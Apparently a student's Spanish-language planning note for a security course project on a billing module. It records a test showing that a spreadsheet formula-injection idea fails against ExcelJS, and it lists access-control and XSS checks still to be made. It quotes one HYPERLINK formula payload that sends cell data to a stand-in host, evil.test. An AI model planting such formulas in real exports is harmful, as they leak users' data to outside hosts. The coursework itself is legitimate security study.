---
curso: Seguridad
tema: "Proyecto Final — Módulo Facturación (Marcos), notas de arranque Fase 1-2"
fecha: 2026-09-18
tipo: entregable
entregable_de: "[[Cursos/Seguridad/entregables/proyecto-final-organizacion]]"
estado: borrador
tags: [proyecto-final, facturacion, fase-1, fase-2, poc]
---

# Proyecto Final — Módulo Facturación (Marcos)

Ver también: [[Cursos/Seguridad/entregables/proyecto-final-organizacion]] · [[Cursos/Seguridad/entregables/proyecto-final-fase1-gobernanza]] · [[Cursos/Seguridad/apuntes/proyecto-final-instrucciones]]

Marcos confirmó (2026-09-17) que toma **Facturación** como su módulo — sigue pendiente que el resto del equipo confirme el suyo, pero esto ya es un punto de partida sólido para su propia parte.

## Corrección importante: el vector de "CSV/Excel injection" propuesto NO funciona

La nota original ([[Cursos/Seguridad/entregables/proyecto-final-organizacion]]) proponía como candidato de PoC de Fase 2 (vector "Alteración de entrada") una inyección de fórmulas vía el campo `origen` (texto libre) hacia `facturasExcel.ts`. **Se verificó esta noche y no aplica**, con evidencia:

**Prueba:** se replicó exactamente el patrón real del código (`hoja.addRow(COLUMNAS.map(c => c.valor(factura)))`, `backend/src/services/facturasExcel.ts` líneas ~100-104) con un payload de fórmula en un script Node aislado (ExcelJS 4.4.0, misma versión que el backend):

```js
hoja.addRow(["Juan Perez", '=HYPERLINK("http://evil.test/leak?d="&A2,"Ver detalle")'])
```

Se abrió el `.xlsx` resultante como ZIP y se inspeccionó `xl/worksheets/sheet1.xml`: la celda quedó como `<c r="B2" t="s"><v>3</v></c>` — tipo `s` (shared string), no `t="str"` ni un elemento `<f>` de fórmula. `xl/sharedStrings.xml` confirma que el texto completo del payload, comillas incluidas, quedó guardado como texto literal:

```xml
<si><t>=HYPERLINK(&quot;http://evil.test/leak?d=&quot;&amp;A2,&quot;Ver detalle&quot;)</t></si>
```

**Conclusión:** ExcelJS, al escribir un string plano dentro de un array pasado a `addRow` (que es exactamente el patrón que usa `facturasExcel.ts`), lo guarda como celda de texto explícito. Excel/LibreOffice no la evalúa como fórmula al abrir el archivo — el formato XLSX declara el tipo de celda de forma explícita, a diferencia de un CSV plano donde Excel sí aplica heurísticas de auto-detección al importar. **No uses este vector para la PoC de Fase 2**, se cae apenas alguien lo intente reproducir en la exposición.

## Otra corrección: "manipulación de parámetros fuera de rango" está más blindada de lo que parecía

Revisando `backend/src/routes/facturas.routes.ts` (`calcularImporte`, `resolverBase`, `resolverMonto`): `descuento_monto` y `comision_valor` sí están clamped con `Math.min`/`Math.max` contra el precio base, y `precio_base <= 0` se rechaza explícitamente. El servidor recalcula todo, como decía la nota original — la superficie es más chica de lo que sonaba.

**Lo único que quedó suelto (sin verificar en profundidad, para revisar mañana con la app corriendo):** en el modo `precio_abierto`, `precio_base = Number(body.precio_base ?? NaN)` no tiene tope superior — se rechaza `<= 0` pero no hay máximo. No es una vulnerabilidad de las categorías obligatorias (no es inyección ni control de acceso), así que probablemente no sirve como el vector "Servidor" de la rúbrica, pero puede ser un hallazgo secundario de integridad de datos para la Matriz de Gobernanza (Fase 1) si hace falta un ejemplo adicional de control de línea base faltante.

## Qué falta para armar las 3 PoCs reales (necesita la app corriendo, no se resolvió esta noche)

No se levantó el stack completo (Postgres + Prisma + seed + frontend) porque hubiera significado más riesgo/tiempo que el resto de lo adelantado esta noche, y además la rúbrica pide que cada quien entienda y pueda explicar su propia PoC en el video — mejor que la construyas vos mismo con la app corriendo, no que la reciba ya hecha. Puntos de partida concretos para retomar:

1. **Servidor (SQLi/BAC/JWT):** revisar si `GET /api/facturas` y `GET /api/facturas/:id` deberían filtrar por algún criterio de propiedad/rol que hoy no aplican (`authMiddleware` genérico, sin chequeo de rol — mismo patrón que el hallazgo ya confirmado de `usuarios`). Si el negocio es de un solo staff sin jerarquía de roles, este vector puede no aplicar a Facturación y haya que buscarlo en otra parte del módulo (ej. IDs secuenciales en `/:id` sin ningún control adicional).
2. **Cliente (XSS):** revisar si `origen` (u otro campo de texto libre de facturas) se renderiza sin sanitizar en `FacturasPage.tsx`/`FacturaFormDialog.tsx` del frontend — ese sí sigue siendo un candidato válido, pero hay que confirmarlo mirando el componente React real, no asumirlo.
3. **Alteración de entrada + Audit Poisoning:** este vector depende de que exista el módulo de Logs/Auditoría (Persona 4, todavía sin construir — ver [[Cursos/Seguridad/entregables/proyecto-final-organizacion]]). No se puede completar la PoC de Facturación para este punto hasta que esa capa exista, aunque sea en forma mínima.

## Siguiente paso real

Cuando tengas un rato con la app corriendo (Docker Compose del propio repo, ver `DEPLOY.md`), estos 3 puntos son el punto de partida directo, ya con el ángulo incorrecto descartado para no perder tiempo repitiendo la prueba de Excel.
